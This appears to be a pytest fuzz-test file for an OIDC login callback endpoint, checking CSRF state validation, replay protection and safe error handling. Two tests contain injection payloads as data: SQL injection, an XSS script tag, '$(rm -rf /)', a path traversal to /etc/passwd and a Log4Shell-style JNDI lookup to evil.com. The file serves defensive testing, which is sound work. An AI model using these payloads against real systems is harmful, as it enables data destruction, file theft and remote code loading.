# SPDX-License-Identifier: MIT
# Copyright (c) 2025 Copilot-for-Consensus contributors

"""Fuzz tests for auth service OIDC callback flow.

This module implements comprehensive fuzzing for the auth service OIDC callback
endpoint to find security vulnerabilities and edge cases. This addresses
security issue #1098 (test P0 priority).

The tests use three complementary fuzzing approaches:

1. **Hypothesis (Property-Based Testing)**:
   - Tests invariants that should hold for all inputs
   - Example: callback should never crash, should always return valid JSON
   - Generates edge cases automatically (empty strings, Unicode, special chars)

2. **Schemathesis (API Schema Fuzzing)**:
   - Generates tests from OpenAPI schema definition
   - Validates API contract compliance
   - Tests error handling paths

3. **Direct Edge Case Tests**:
   - Tests specific security scenarios
   - Validates CSRF protection via state parameter
   - Tests injection attack vectors (SQL, XSS, command injection)
   - Tests DoS resilience (very long parameters)

Security targets (from issue):
- /callback?code=&state= parameter handling
- State parameter validation (CSRF protection)
- Authorization code exchange
- Error handling paths

Risk areas covered:
- CSRF attacks via state parameter manipulation
- Open redirect vulnerabilities  
- Injection vulnerabilities (SQL, XSS, command injection, path traversal)
- Session fixation/hijacking
- Replay attacks (single-use states)
- DoS via very long parameters
"""

import sys
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Check if fuzzing tools are available
try:
    from hypothesis import given, strategies as st, settings, Phase, HealthCheck
    HYPOTHESIS_AVAILABLE = True
except ImportError:
    HYPOTHESIS_AVAILABLE = False
    given = st = settings = Phase = HealthCheck = None  # type: ignore[assignment, misc]

try:
    from schemathesis.openapi import from_dict
    SCHEMATHESIS_AVAILABLE = True
except ImportError:
    SCHEMATHESIS_AVAILABLE = False
    from_dict = None  # type: ignore[assignment, misc]

# Add auth directory to path for imports
auth_dir = Path(__file__).parent.parent.parent / "auth"
sys.path.insert(0, str(auth_dir))


@pytest.fixture
def mock_auth_service():
    """Create a mock auth service with realistic behavior.
    
    This mock simulates the real auth service's session-based state management:
    - States are single-use (consumed after successful validation)
    - Empty strings are treated as invalid input
    - Special prefixes trigger specific error conditions for testing
    """
    service = MagicMock()
    service.config.service_settings.audiences = "copilot-for-consensus"
    service.config.service_settings.jwt_default_expiry = 1800
    service.config.service_settings.cookie_secure = False
    
    # Track used state values to simulate single-use CSRF tokens / replay protection
    used_states: set[str] = set()
    
    # Mock handle_callback with realistic behavior
    async def mock_handle_callback(code: str, state: str) -> str:
        """Mock callback that validates input and enforces single-use state."""
        # Basic input validation - empty strings are invalid
        if not code or code.strip() == "":
            raise ValueError("Missing authorization code")
        if not state or state.strip() == "":
            raise ValueError("Invalid or expired state")
        
        # Simulate invalid/expired session semantics via prefixes
        if state.startswith("invalid"):
            raise ValueError("Invalid or expired state")
        if state.startswith("expired"):
            raise ValueError("Session expired")
        
        # Enforce single-use state to simulate replay protection
        if state in used_states:
            raise ValueError("State already used")
        
        # Simulate provider-auth error on bad authorization code
        if code == "bad_code":
            # Use a simple ValueError instead of importing from copilot_auth
            # to avoid import issues when adapter is not installed
            raise ValueError("Invalid authorization code")
        
        # Mark state as consumed after successful validation
        used_states.add(state)
        
        # Return a mock JWT token
        return "mock.jwt.token"
    
    service.handle_callback = mock_handle_callback
    service.is_ready.return_value = True
    
    return service


@pytest.fixture
def test_client(mock_auth_service):
    """Create test client with mocked auth service."""
    import importlib
    from fastapi.testclient import TestClient
    
    with patch("sys.path", [str(auth_dir)] + sys.path):
        import main
        importlib.reload(main)
        main.auth_service = mock_auth_service
        return TestClient(main.app)


# ============================================================================
# Hypothesis Property-Based Tests
# ============================================================================

@pytest.mark.skipif(not HYPOTHESIS_AVAILABLE, reason="hypothesis not installed")
class TestCallbackPropertyBased:
    """Property-based tests for callback endpoint using Hypothesis."""
    
    @given(
        code=st.text(min_size=1, max_size=1000),
        state=st.text(min_size=1, max_size=1000)
    )
    @settings(
        max_examples=100,
        suppress_health_check=[HealthCheck.function_scoped_fixture],
        phases=[Phase.generate, Phase.target]
    )
    def test_callback_never_crashes(self, test_client, code: str, state: str):
        """Property: Callback should never crash regardless of input.
        
        This tests that the endpoint handles all inputs gracefully,
        returning appropriate error codes rather than crashing.
        """
        response = test_client.get(
            "/callback",
            params={"code": code, "state": state}
        )
        
        # Should always return a valid HTTP response
        assert 100 <= response.status_code < 600
        
        # Should never return 500 (internal server error)
        # Valid responses: 200 (success), 400 (bad request)
        assert response.status_code in (200, 400)
    
    @given(
        code=st.text(alphabet=st.characters(blacklist_categories=("Cs",)), min_size=1, max_size=1000),
        state=st.text(alphabet=st.characters(blacklist_categories=("Cs",)), min_size=1, max_size=1000)
    )
    @settings(
        max_examples=100,
        suppress_health_check=[HealthCheck.function_scoped_fixture],
        phases=[Phase.generate]
    )
    def test_callback_json_response(self, test_client, code: str, state: str):
        """Property: Callback should always return valid JSON.
        
        This ensures the endpoint consistently returns JSON responses,
        important for API clients that expect JSON.
        """
        response = test_client.get(
            "/callback",
            params={"code": code, "state": state}
        )
        
        # Should be able to parse as JSON
        try:
            data = response.json()
            assert isinstance(data, dict)
        except Exception:
            pytest.fail("Response should be valid JSON")
    
    @given(state=st.text(min_size=1, max_size=100))
    @settings(
        max_examples=50,
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    def test_invalid_state_rejected(self, test_client, state: str):
        """Property: Invalid states should be rejected with 400.
        
        Tests CSRF protection by ensuring invalid state parameters
        are rejected.
        """
        # Use invalid state prefix to trigger validation error
        invalid_state = f"invalid_{state}"
        response = test_client.get(
            "/callback",
            params={"code": "valid_code", "state": invalid_state}
        )
        
        # Invalid state should result in 400 error
        assert response.status_code == 400
        data = response.json()
        assert "detail" in data
    
    @given(code=st.text(min_size=1, max_size=100))
    @settings(
        max_examples=50,
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    def test_bad_auth_code_rejected(self, test_client, code: str):
        """Property: Invalid authorization codes should be rejected.
        
        Tests that the endpoint properly validates authorization codes
        from the OIDC provider.
        """
        # Use "bad_code" to trigger auth error
        response = test_client.get(
            "/callback",
            params={"code": "bad_code", "state": "valid_state"}
        )
        
        # Bad auth code should result in a 400 client error
        assert response.status_code == 400
        data = response.json()
        assert "detail" in data
    
    @given(
        text=st.text(alphabet=st.characters(
            blacklist_categories=("Cs",),
            blacklist_characters=set("\x00\r\n")
        ), min_size=1, max_size=500)
    )
    @settings(
        max_examples=100,
        suppress_health_check=[HealthCheck.function_scoped_fixture]
    )
    def test_no_injection_in_parameters(self, test_client, text: str):
        """Property: Callback should not be vulnerable to injection attacks.
        
        Tests that special characters, SQL injection attempts, XSS payloads,
        and command injection attempts are safely handled.
        """
        # Test common injection patterns
        injection_attempts = [
            text,  # Random text
            f"'; DROP TABLE users; --",  # SQL injection
            f"<script>alert('xss')</script>",  # XSS
            f"$(rm -rf /)",  # Command injection
            f"../../etc/passwd",  # Path traversal
            f"%00",  # Null byte injection
        ]
        
        for payload in injection_attempts:
            response = test_client.get(
                "/callback",
                params={"code": payload, "state": payload}
            )
            
            # Should handle gracefully
            assert 100 <= response.status_code < 600
            
            # Response should not echo back payload unescaped
            response_text = response.text
            # Basic check: if payload contains <script>, response shouldn't
            # contain it without HTML encoding (check case-insensitively)
            if "<script>" in payload.lower():
                lowered_response = response_text.lower()
                # Response should NOT contain raw script tag unless it's escaped
                assert "<script>" not in lowered_response or "&lt;script&gt;" in lowered_response


# ============================================================================
# Schemathesis API Fuzzing Tests
# ============================================================================

@pytest.mark.skipif(not SCHEMATHESIS_AVAILABLE, reason="schemathesis not installed")
class TestCallbackSchemathesis:
    """API fuzzing tests for callback endpoint using Schemathesis."""
    
    def test_callback_openapi_schema_fuzzing(self):
        """Fuzz callback endpoint based on OpenAPI schema.
        
        This generates test cases from the OpenAPI specification
        to ensure the endpoint handles various input combinations.
        """
        # Define OpenAPI schema for callback endpoint
        schema_dict = {
            "openapi": "3.0.0",
            "info": {
                "title": "Auth Service Callback API",
                "version": "1.0.0"
            },
            "paths": {
                "/callback": {
                    "get": {
                        "summary": "OIDC callback handler",
                        "parameters": [
                            {
                                "name": "code",
                                "in": "query",
                                "required": True,
                                "schema": {"type": "string"},
                                "description": "Authorization code from provider"
                            },
                            {
                                "name": "state",
                                "in": "query",
                                "required": True,
                                "schema": {"type": "string"},
                                "description": "OAuth state parameter"
                            }
                        ],
                        "responses": {
                            "200": {
                                "description": "Successful callback",
                                "content": {
                                    "application/json": {
                                        "schema": {
                                            "type": "object",
                                            "properties": {
                                                "access_token": {"type": "string"},
                                                "token_type": {"type": "string"},
                                                "expires_in": {"type": "integer"}
                                            },
                                            "required": ["access_token", "token_type"]
                                        }
                                    }
                                }
                            },
                            "400": {
                                "description": "Invalid request",
                                "content": {
                                    "application/json": {
                                        "schema": {
                                            "type": "object",
                                            "properties": {
                                                "detail": {"type": "string"}
                                            }
                                        }
                                    }
                                }
                            },
                            "503": {
                                "description": "Service not ready"
                            }
                        }
                    }
                }
            }
        }
        
        # Load schema
        schema = from_dict(schema_dict)
        assert schema is not None
        
        # Verify schema loaded correctly
        operations = []
        for op_result in schema.get_all_operations():
            operation = op_result.ok()
            assert operation is not None
            operations.append(operation)
        
        assert len(operations) > 0
        assert any(op.path == "/callback" for op in operations)
        
        # Verify parameters are defined
        callback_op = next(op for op in operations if op.path == "/callback")
        assert callback_op.method.upper() == "GET"
    
    def test_callback_error_handling_fuzzing(self):
        """Fuzz error handling paths in callback endpoint.
        
        This specifically targets error scenarios to ensure
        proper error handling and no information leakage.
        """
        # Schema focused on error cases
        schema_dict = {
            "openapi": "3.0.0",
            "info": {
                "title": "Auth Callback Error Cases",
                "version": "1.0.0"
            },
            "paths": {
                "/callback": {
                    "get": {
                        "summary": "Error handling test",
                        "parameters": [
                            {
                                "name": "code",
                                "in": "query",
                                "required": True,
                                "schema": {
                                    "type": "string",
                                    "enum": ["", "bad_code", "null", "undefined", "../../secret"]
                                }
                            },
                            {
                                "name": "state",
                                "in": "query",
                                "required": True,
                                "schema": {
                                    "type": "string",
                                    "enum": ["", "invalid_state", "expired_state", "<script>"]
                                }
                            }
                        ],
                        "responses": {
                            "400": {"description": "Expected error"}
                        }
                    }
                }
            }
        }
        
        schema = from_dict(schema_dict)
        assert schema is not None
        
        # Verify error test schema
        operations = list(schema.get_all_operations())
        assert len(operations) > 0


# ============================================================================
# Direct Unit Tests for Edge Cases
# ============================================================================

class TestCallbackEdgeCases:
    """Direct unit tests for specific edge cases and security scenarios."""
    
    def test_missing_code_parameter(self, test_client):
        """Test callback with missing code parameter."""
        response = test_client.get("/callback", params={"state": "test_state"})
        
        # Should return 422 (validation error for missing required param)
        assert response.status_code == 422
    
    def test_missing_state_parameter(self, test_client):
        """Test callback with missing state parameter."""
        response = test_client.get("/callback", params={"code": "test_code"})
        
        # Should return 422 (validation error for missing required param)
        assert response.status_code == 422
    
    def test_empty_code_parameter(self, test_client):
        """Test callback with empty code parameter."""
        response = test_client.get("/callback", params={"code": "", "state": "test_state"})
        
        # Should reject empty code
        assert response.status_code in (400, 422)
    
    def test_empty_state_parameter(self, test_client):
        """Test callback with empty state parameter."""
        response = test_client.get("/callback", params={"code": "test_code", "state": ""})
        
        # Should reject empty state
        assert response.status_code in (400, 422)
    
    def test_very_long_parameters(self, test_client):
        """Test callback with very long parameters (potential DoS)."""
        long_string = "x" * 100000  # 100KB string
        
        # The endpoint should validate input sizes and respond with an appropriate
        # client error status (bad request or entity/URI too large), rather than
        # crashing or accepting the request.
        try:
            response = test_client.get(
                "/callback",
                params={"code": long_string, "state": "test_state"}
            )
            
            # If the request goes through, should handle gracefully
            assert response.status_code in (400, 413, 414, 422)
        except (ValueError, OSError):
            # httpx.InvalidURL (ValueError subclass) or network-level exceptions
            # are acceptable - the client library is protecting against DoS
            pass
    
    def test_unicode_in_parameters(self, test_client):
        """Test callback with Unicode characters in parameters."""
        unicode_strings = [
            "🔒🔑",  # Emojis
            "مرحبا",  # Arabic
            "你好",  # Chinese
            "🚀💻🌐",  # Mixed emojis
        ]
        
        for unicode_str in unicode_strings:
            response = test_client.get(
                "/callback",
                params={"code": unicode_str, "state": unicode_str}
            )
            
            # Should handle gracefully
            assert 100 <= response.status_code < 600
    
    def test_special_characters_in_parameters(self, test_client):
        """Test callback with special characters that might cause issues."""
        special_chars = [
            "'; DROP TABLE users; --",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../etc/passwd",  # Path traversal
            "${jndi:ldap://evil.com/a}",  # Log4shell-style
            "%00",  # Null byte
            "\r\n\r\n",  # CRLF injection
        ]
        
        for special in special_chars:
            response = test_client.get(
                "/callback",
                params={"code": special, "state": "test_state"}
            )
            
            # Should handle safely without server errors
            assert response.status_code in (200, 400, 422)
            
            # For JSON responses, ensure reflected XSS payloads are not
            # included unescaped in the error detail.
            if "<script" in special.lower():
                try:
                    data = response.json()
                    detail = data.get("detail")
                    if isinstance(detail, str):
                        lowered_detail = detail.lower()
                        # No raw <script> tag should appear in the detail message
                        assert "<script" not in lowered_detail
                except (ValueError, KeyError):
                    pass  # Non-JSON response or missing detail field is OK
    
    def test_csrf_state_validation(self, test_client):
        """Test CSRF protection via state parameter validation."""
        # Test with invalid state prefix (triggers mock validation error)
        response = test_client.get(
            "/callback",
            params={"code": "valid_code", "state": "invalid_random_state"}
        )
        
        assert response.status_code == 400
        data = response.json()
        assert "detail" in data
        # The mock returns "Invalid or expired state" for invalid prefix
        detail_lower = data["detail"].lower()
        assert "invalid" in detail_lower or "expired" in detail_lower or "state" in detail_lower
    
    def test_expired_session(self, test_client):
        """Test handling of expired session states."""
        response = test_client.get(
            "/callback",
            params={"code": "valid_code", "state": "expired_session_state"}
        )
        
        assert response.status_code == 400
        data = response.json()
        assert "detail" in data
        # The mock returns "Session expired" for expired prefix
        detail_lower = data["detail"].lower()
        assert "expired" in detail_lower or "session" in detail_lower
    
    def test_duplicate_callback_requests(self, test_client):
        """Test that callback cannot be replayed (state should be single-use)."""
        # First request should succeed with a fresh, valid state
        response1 = test_client.get(
            "/callback",
            params={"code": "valid_code", "state": "replay_test_state"}
        )
        
        # Second request with same parameters must fail because the state was consumed
        response2 = test_client.get(
            "/callback",
            params={"code": "valid_code", "state": "replay_test_state"}
        )
        
        # Enforce replay protection semantics: first succeeds, second fails
        assert response1.status_code == 200
        assert response2.status_code == 400
    
    def test_valid_callback_success(self, test_client):
        """Test that a completely valid callback succeeds with proper response."""
        # Use a unique state that won't trigger any mock error conditions
        response = test_client.get(
            "/callback",
            params={"code": "valid_authorization_code", "state": "valid_unique_state_12345"}
        )
        
        # Successful callback should return 200
        assert response.status_code == 200
        
        # Response should be valid JSON
        data = response.json()
        assert isinstance(data, dict)


if __name__ == "__main__":
    pytest.main([__file__, "-v", "--timeout=300"])
